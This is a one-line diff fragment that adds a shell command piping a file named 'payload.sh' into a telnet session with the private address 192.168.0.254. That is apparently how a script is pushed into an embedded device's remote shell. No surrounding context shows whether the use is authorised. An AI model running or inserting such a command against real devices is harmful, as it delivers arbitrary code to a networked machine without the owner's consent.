@@ -1,0 +1,1 @@
+(cat payload.sh; sleep 15) | telnet 192.168.0.254
